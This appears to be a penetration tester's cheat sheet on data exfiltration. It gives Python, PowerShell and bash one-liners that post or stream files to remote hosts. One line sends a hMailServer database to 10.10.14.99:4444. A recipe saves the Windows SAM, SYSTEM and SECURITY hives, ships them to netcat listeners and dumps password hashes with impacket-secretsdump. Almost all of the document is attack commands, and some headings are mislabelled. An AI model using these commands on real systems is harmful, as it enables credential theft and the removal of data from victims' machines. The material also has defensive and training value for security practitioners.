# Data Exfiltration

## Powershell

### Download file via Python (oneliner)

```bash
python -c "import urllib.request; urllib.request.urlretrieve('http://example.com/file.txt', 'file.txt')"
```

### Post file via Python (oneliner)

```bash
python -c "import urllib.request, urllib.parse; urllib.request.urlopen(urllib.request.Request('http://example.com/upload', data=urllib.parse.urlencode({'file': open('file.txt', 'rb').read()}).encode()))"
```

### Send file via Python sockets (oneliner)

```bash
python -c "import socket; s = socket.socket(); s.connect(('localhost', 8080)); s.sendall(open('file.txt', 'rb').read()); s.close()"
```

## Powershell

### Send file via Powershell sockets

```powershell
$server = "127.0.0.1"
$port = 8080
$filePath = "file.txt"

$tcpClient = New-Object System.Net.Sockets.TcpClient($server, $port)
$networkStream = $tcpClient.GetStream()
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$networkStream.Write($fileBytes, 0, $fileBytes.Length)
$networkStream.Flush()
$networkStream.Close()
$tcpClient.Close()
```

```powershell
function SendOverTcp {
    param ([string]$server, $port, $filePath)
    $tcpClient = New-Object Net.Sockets.TcpClient($server, $port)
    $stream = $tcpClient.GetStream()
    $bytes = [IO.File]::ReadAllBytes($filePath)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $tcpClient.Close()
}

function SendOverTcp { param([string]$server, $port, $filePath); ($tcpClient = New-Object Net.Sockets.TcpClient($server, $port)).GetStream().Write(($bytes = [IO.File]::ReadAllBytes($filePath)), 0, $bytes.Length); $tcpClient.Close() }

SendOverTcp "localhost" 8080 "file.txt"
SendOverTcp "10.10.14.99" 4444 "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf"
```

## Bash

### Send file via Linux sockets

```bash
cat file.txt > /dev/tcp/IP/PORT
cat file.txt | base64 > /dev/tcp/IP/PORT
---
listen > file.txt
cat file.txt.base64 | base64 -d > file.txt
```

## Hashdump locally with hives

Source: [https://gist.github.com/sh1n0b1/8972807](https://gist.github.com/sh1n0b1/8972807)

```powershell 
nc -lvnp 4444 > sam.save &
nc -lvnp 4445 > system.save &
nc -lvnp 4446 > security.save &
---
# Save registry keys
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save

# Exfiltrate registry
function SendOverTcp { param([string]$server, $port, $filePath); ($tcpClient = New-Object Net.Sockets.TcpClient($server, $port)).GetStream().Write(($bytes = [IO.File]::ReadAllBytes($filePath)), 0, $bytes.Length); $tcpClient.Close() }
$server = "10.10.14.123";
$port = 4444; $filePath = "C:\users\public\music\sam.save"; SendOverTcp "$server" "$port" "$filePath"
$port = 4445; $filePath = "C:\users\public\music\system.save"; SendOverTcp "$server" "$port" "$filePath"
$port = 4446; $filePath = "C:\users\public\music\security.save"; SendOverTcp "$server" "$port" "$filePath"
---
# Dump via impacket secretsdump
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

> **Note**: Security may not be must?

